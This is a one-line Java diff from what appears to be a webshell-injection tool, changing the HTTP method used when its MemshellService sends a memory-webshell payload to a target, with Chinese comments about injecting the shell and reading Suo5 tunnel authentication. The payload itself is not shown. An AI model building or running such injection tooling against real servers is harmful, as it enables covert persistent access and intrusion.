@@ -133,7 +133,7 @@ public class MemshellService {
         FormBody formBody = new FormBody.Builder().add("token", memshellPayload).build();
 
         // 注入内存马
-        ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, formBody, headers, "POST");
+        ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, formBody, headers, targetOBJ.getRequestType());
         String responseStr = Tools.bytesToString(responseOBJ.getResponse());
 
         // 解析 Suo5 的认证信息（响应中会返回设置的值）
